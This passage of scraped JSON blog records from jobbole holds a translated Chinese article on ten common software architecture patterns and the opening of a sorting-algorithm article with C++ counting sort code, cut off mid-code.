href=\"http://www.jobbole.com/members/liuchang/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 37</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://blog.csdn.net/github_36299736\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2577872237\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,职场", "url": "http://blog.jobbole.com/113956/", "url_obj_id": "6a9a2f2ed164a2490d1813a3bb30a2b5"}
{"front_img_url": ["http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233646527354.jpg"], "title": "10 个常用的软件架构模式", "create_date": "2018/05/13 ·", "praise_num": 2, "fav_num": 6, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/a1ickgu0\">Alick</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://towardsdatascience.com/10-common-software-architectural-patterns-in-a-nutshell-a0b47a1e9013\">towardsdatascience.com</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>你是否曾经思考过如何设计大型的企业级系统？在决定启动软件开发之前，首要的是选择恰当的架构来指引系统的功能及质量属性设计。因此在将软件架构应用于设计之前，必需要了解常用的架构模式。</p>\n<p><img src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233646527354.jpg\" alt=\"\"></p>\n<h2>什么是架构模式?</h2>\n<p>Wikipedia 的解释：</p>\n<blockquote><p>在软件架构中，架构模式是对特定环境下常见问题的通用且可重用的解决方案。架构模式与软件设计模式很相似，但架构模式的层次更高，且外延更大。</p></blockquote>\n<p>这篇文章将简述常见的 10 种架构模式的概念、用法以及其优缺点。</p>\n<ol>\n<li>分层模式(Layered pattern)</li>\n<li>客户端／服务器模式(Client-server pattern)</li>\n<li>主／从模式(Master-slave pattern)</li>\n<li>管道／过滤器模式(Pipe-filter pattern)</li>\n<li>代理模式(Broker pattern)</li>\n<li>对等模式(Peer-to-peer pattern)</li>\n<li>事件总线模式(Event-bus pattern)</li>\n<li>模型／视图／控制器(MVC)模式(Model-view-controller pattern)</li>\n<li>黑板模式(Blackboard pattern)</li>\n<li>解析器模式(Interpreter pattern)</li>\n</ol>\n<h2>1. 分层模式(Layered pattern)</h2>\n<p>分层模式用于对结构化设计的软件进行层次拆解，每个层次为独立的抽象，为其上层抽象提供服务。</p>\n<p>系统通常被拆分为以下四个层次：</p>\n<ul>\n<li>表示层（也称为 UI 层）</li>\n<li>应用层（也称为服务层）</li>\n<li>业务逻辑层（也称为领域层）</li>\n<li>数据访问层（也称为持久化层）</li>\n</ul>\n<h3>使用场景</h3>\n<ul>\n<li>通用桌面应用程序</li>\n<li>电子商务 Web 应用</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233648925198.jpg\" alt=\"\"></p>\n<h2>2. 客户端／服务器模式(Client-server pattern)</h2>\n<p>客户端／服务器模式由两个部分构成：一个服务器与多个客户端。服务器组件同时为多个客户端组件提供服务。客户端向服务器发启服务请求，服务器将相应服务信息回应给客户端。此外，服务器持续监听来自客户端的请求。</p>\n<h3>使用场景</h3>\n<ul>\n<li>电子邮件、文件共享及银行业务等在线应用</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233717833733.jpg\" alt=\"\"></p>\n<h2>3. 主／从模式(Master-slave pattern)</h2>\n<p>主／从模式由两个部分构成：主设备与从设备。主服务组件将作业分发给多个从设备组件，并根据这些从设备反馈的结果，计算生成最终结果。</p>\n<h3>使用场景</h3>\n<ul>\n<li>数据库复制，主数据库被认定为权威数据源，各从数据库与主数据保持同步</li>\n<li>在计算机系统中通过总线互连的各设备（包括主设备与从设备）</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233718238936.jpg\" alt=\"\"></p>\n<h2>4. 管道／过滤器模式(Pipe-filter pattern)</h2>\n<p>管道／过滤器模式用于构造用于生成及处理数据流的系统。每个处理过程都封装在<code>过滤器（filter）</code>组件之中，要处理的数据通过 <code>管道(pips)</code> 进行投递。管道同时用于作为 <code>过滤器（filter）</code> 间的缓冲及同步。</p>\n<h3>使用场景</h3>\n<ul>\n<li>编译器，一系列的过滤器用于词法分析、语法分析、语义分析及代码生成</li>\n<li>生物信息学的工作流</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233718865512.jpg\" alt=\"\"></p>\n<h2>5. 代理模式（Broker pattern）</h2>\n<p>代理模式用于在结构化系统中对组件解耦。系统内各组件间采用远过程调用（remote service invocations）的方式交互。<strong>代理（Broker）</strong>组件充当组件间通讯的协调角色。</p>\n<p>提供服务的组件将其能力（服务以及特性）发布给代理，客户端均向代理请求服务，由代理将请求重定向到先前已发布过对应服务的组件进行处理。</p>\n<h2>使用场景</h2>\n<ul>\n<li>消息中间件软件：Apache ActiveMQ，Apache Kafka，RabbitMQ 与 JBoss 等等</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233719444041.jpg\" alt=\"\"></p>\n<h2>6. 对等模式(Peer-to-peer pattern)</h2>\n<p>对等模式中的组件称之为对等体（peer），对等体既作为向其他对等体请求服务的客户端，同时也做为响应其他对等体请求的服务端。对等体可以在运行过程中动态地改变其角色，即，既可以单独做为客户端或服务端运行，又可同时作为客户端与服务端运行。</p>\n<h3>使用场景</h3>\n<ul>\n<li>网络文件共享：<a href=\"https://en.wikipedia.org/wiki/Gnutella\">Gnutella</a> 与 <a href=\"https://en.wikipedia.org/wiki/Gnutella2\">G2</a>)</li>\n<li>流媒体协议：<a href=\"https://en.wikipedia.org/wiki/P2PTV\">P2PTV</a> 与 <a href=\"https://en.wikipedia.org/wiki/Peer_Distributed_Transfer_Protocol\">PDTP</a>.</li>\n<li>流媒体应用： <a href=\"https://en.wikipedia.org/wiki/Spotify\">Spotify</a>.</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233720492236.jpg\" alt=\"\"></p>\n<h2>7. 事件总线模式（Event-bus pattern）</h2>\n<p>事件总线模式应用于事件处理，主要由四个组件构成：<strong>事件源（event source），事件侦听者（event listener），通道（Channel）以及总线（event bus）</strong>。 事件源将消息发布到总线的特定通道，侦听者订阅相应的通道，事件源所发布的消息经通道通告给订阅通道的侦听者。</p>\n<h3>使用场景</h3>\n<ul>\n<li>Android 开发</li>\n<li>通告（Notification）服务</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233720911021.jpg\" alt=\"\"></p>\n<h2>8. 模型／视图／控制器(MVC)模式（Model-view-controller pattern）</h2>\n<p>模型／视图／控制器模式（简称 MVC 模式）将交互式应用程序拆分为三个部分：</p>\n<ol>\n<li><strong>模型（model）</strong> – 包含核心功能及数据</li>\n<li><strong>视图（view）</strong> – 呈现信息给用户（通过有多个视图）</li>\n<li><strong>控制器（controller）</strong> – 处理用户的输入操作</li>\n</ol>\n<p>MVC 模式通过将内部信息表示、用户信息呈现以及用户操作接收分开的方式解耦组件，实现高效代码重用。</p>\n<h3>使用场景</h3>\n<ul>\n<li>主流开发语言所构建的互联网网页应用架构</li>\n<li><a href=\"https://en.wikipedia.org/wiki/Django_%28web_framework%29\">Django</a> 与 <a href=\"https://en.wikipedia.org/wiki/Ruby_on_Rails\">Rails</a> 等网页应用开发框架</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233721635183.jpg\" alt=\"\"></p>\n<h2>9. 黑板模式（Blackboard pattern）</h2>\n<p>黑板模式适用于 <code>无预知确定解决策略</code> 的问题，主要由三个组件构成：</p>\n<ul>\n<li><strong>黑板（blackboard）</strong> – 用于存储解空间对象的结构化全局内存</li>\n<li><strong>知识（knowledge）</strong>源 – 能自表意的专用模块</li>\n<li><strong>控制（control）</strong>组件 – 选择、配置与执行的模块</li>\n</ul>\n<p>所有的组件均能访问黑板，组件可将新生成的数据对象写入黑板，也可以通过模式匹配从黑板中获取知识源所生成的特定数据。</p>\n<h3>使用场景</h3>\n<ul>\n<li>语音识别</li>\n<li>车辆识别和追踪</li>\n<li>蛋白质的结构鉴定</li>\n<li>声纳信号解析</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233722237447.jpg\" alt=\"\"></p>\n<h2>10. 解析器模式（Interpreter pattern）</h2>\n<p>解析器模式用于设计语言的解析程序，主要用于指定评估程序代码行，即解析出特定语言的语句与表达式，其核心思想是为语言的每个符号定义相应的类。</p>\n<h3>使用场景</h3>\n<ul>\n<li>SQL 等数据库查询语言</li>\n<li>通讯协议描述语言</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://7xjudy.com1.z0.glb.clouddn.com/2018-04-25-15233722490294.jpg\" alt=\"\"></p>\n<h2>上述架构模式的对比</h2>\n<p>下表格总结了各架构模式的优缺点</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/525d773e6ca3b2bebc40eb22baac20cf.png\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/03/525d773e6ca3b2bebc40eb22baac20cf.png\" alt=\"10-arch2\"></a></p>\n<p>希望这篇文章对你所帮助，同时我也想听听你的想法。😇</p>\n<p>感谢阅读</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113953\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113953votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113953\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 26 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/a1ickgu0\">Alick</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/a1ickgu0\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/06/b6542d1884eed47149da8f68b90a8fc1-300x300.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            这个码农很懒，啥也没有留下.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/a1ickgu0\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/a1ickgu0/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/a1ickgu0/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 30</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/1798547731/\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术", "url": "http://blog.jobbole.com/113953/", "url_obj_id": "957e4ea5a4a89c6e0be1752b3db3a295"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "title": "常用排序算法总结（2）", "create_date": "2018/05/13 ·", "praise_num": 1, "fav_num": 5, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/eniac12/p/5332117.html\">SteveWang</a>   </div><p><a href=\"http://blog.jobbole.com/113863/\" target=\"_blank\">上一篇总结了常用的比较排序算法</a>，主要有<strong>冒泡排序</strong>，<strong>选择排序</strong>，<strong>插入排序</strong>，<strong>归并排序</strong>，<strong>堆排序</strong>，<strong>快速排序</strong>等。</p>\n<p>这篇文章中我们来探讨一下常用的非比较排序算法：<strong>计数排序</strong>，<strong>基数排序</strong>，<strong>桶排序</strong>。在一定条件下，它们的时间复杂度可以达到O(n)。</p>\n<p>这里我们用到的唯一数据结构就是数组，当然我们也可以利用链表来实现下述算法。</p>\n<h2><a name=\"s1\"></a>计数排序(Counting Sort)</h2>\n<p>计数排序用到一个额外的计数数组C，根据数组C来将原数组A中的元素排到正确的位置。</p>\n<p>通俗地理解，例如有10个年龄不同的人，假如统计出有8个人的年龄不比小明大（即小于等于小明的年龄，这里也包括了小明），那么小明的年龄就排在第8位，通过这种思想可以确定每个人的位置，也就排好了序。当然，年龄一样时需要特殊处理（保证稳定性）：通过反向填充目标数组，填充完毕后将对应的数字统计递减，可以确保计数排序的稳定性。</p>\n<p>计数排序的步骤如下：</p>\n<ol>\n<li>统计数组A中每个值A[i]出现的次数，存入C[A[i]]</li>\n<li>从前向后，使数组C中的每个值等于其与前一项相加，这样数组C[A[i]]就变成了代表数组A中小于等于A[i]的元素个数</li>\n<li>反向填充目标数组B：将数组元素A[i]放在数组B的第C[A[i]]个位置（下标为C[A[i]] – 1），每放一个元素就将C[A[i]]递减</li>\n</ol>\n<p>计数排序的实现代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930959c3027220010\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include&lt;iostream&gt;\r\nusing namespace std;\r\n\r\n// 分类 ------------ 内部非比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- O(n + k)\r\n// 最优时间复杂度 ---- O(n + k)\r\n// 平均时间复杂度 ---- O(n + k)\r\n// 所需辅助空间 ------ O(n + k)\r\n// 稳定性 ----------- 稳定\r\n\r\n\r\nconst int k = 100;   // 基数为100，排序[0,99]内的整数\r\nint C[k];            // 计数数组\r\n\r\nvoid CountingSort(int A[], int n)\r\n{\r\n    for (int i = 0; i &lt; k; i++)   // 初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i &lt; n; i++)   // 使C[i]保存着等于i的元素个数\r\n    {\r\n        C[A[i]]++;\r\n    }\r\n    for (int i = 1; i &lt; k; i++)   // 使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int *)malloc((n) * sizeof(int));// 分配临时空间,长度为n，用来暂存中间数据\r\n    for (int i = n - 1; i &gt;= 0; i--)    // 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)\r\n    {\r\n        B[--C[A[i]]] = A[i];      // 把每个元素A[i]放到它在输出数组B中的正确位置上\r\n                                  // 当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性\r\n    }\r\n    for (int i = 0; i &lt; n; i++)   // 把临时空间B中的数据拷贝回A\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);    // 释放临时空间 \r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 15, 22, 19, 46, 27, 73, 1, 19, 8 };  // 针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素\r\n    int n = sizeof(A) / sizeof(int);\r\n    CountingSort(A, n);\r\n    printf(\"计数排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959c3027220010-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959c3027220010-55\">55</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-1\"><span class=\"crayon-p\">#include&lt;iostream&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-2\"><span class=\"crayon-e\">using </span><span class=\"crayon-t\">namespace</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-4\"><span class=\"crayon-c\">// 分类 ------------ 内部非比较排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-5\"><span class=\"crayon-c\">// 数据结构 --------- 数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-6\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n + k)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-7\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(n + k)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-8\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n + k)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-9\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(n + k)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-10\"><span class=\"crayon-c\">// 稳定性 ----------- 稳定</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-12\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-13\"><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 基数为100，排序[0,99]内的整数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-14\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 计数数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-16\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-17\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span 